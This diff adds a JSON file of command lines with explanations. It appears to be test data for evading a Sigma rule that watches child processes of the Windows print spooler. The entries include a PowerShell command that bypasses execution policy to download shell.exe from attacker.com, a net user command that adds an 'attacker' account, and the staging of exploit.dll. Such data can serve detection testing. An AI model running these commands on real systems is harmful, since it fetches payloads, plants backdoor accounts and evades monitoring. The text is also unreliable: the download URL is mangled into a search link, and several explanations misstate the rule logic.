@@ -1,0 +1,22 @@
+[
+  {
+    "output": "C:\\Windows\\System32\\cmd.exe /c \"echo .spl & start notepad.exe\"",
+    "explanation": "This command creates a cmd.exe process as a child of spoolsv.exe. The command line contains the string '.spl', which triggers the suspicious_cmd_filter, causing the rule to exclude this process from detection."
+  },
+  {
+    "output": "C:\\Windows\\System32\\cmd.exe /c \"mkdir C:\\Temp\\payload && move exploit.dll C:\\Temp\\payload\\\"",
+    "explanation": "The Sigma rule for cmd.exe triggers only if the CommandLine contains specific strings like '.spl', 'route add', or 'program files'. By executing a command that avoids these specific substrings, the 'suspicious_cmd_filter' condition evaluates to true, causing the 'not suspicious_cmd_filter' logic to fail and allowing the child process to execute without alerting."
+  },
+  {
+    "output": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -Uri [http://attacker.com/shell.exe](https://www.google.com/search?q=http://attacker.com/shell.exe) -OutFile C:\\Windows\\Temp\\shell.exe\"",
+    "explanation": "The rule monitors PowerShell child processes of spoolsv.exe but specifically filters for the presence of '.spl' in the command line. A standard PowerShell command used for staging or execution that does not reference a spool file (.spl) will bypass the 'suspicious_powershell_filter' and therefore the entire rule."
+  },
+  {
+    "output": "C:\\Windows\\System32\\net.exe user attacker Password123 /add",
+    "explanation": "The rule flags 'net.exe' or 'net1.exe' unless the command line contains 'start'. By using 'net user' or 'net localgroup' commands instead of 'net start', the 'suspicious_net_filter' is not met, which bypasses the detection logic."
+  },
+  {
+    "output": "C:\\Windows\\System32\\calc.exe",
+    "explanation": "The rule relies on a specific allow-list/deny-list of suspicious process names (e.g., whoami, reg, powershell). Executing a process not defined in the 'suspicious_unrestricted' list or other filtered categories, such as calc.exe or a custom-named binary (e.g., svchost.exe moved to a writable directory), will not trigger the rule."
+  }
+]
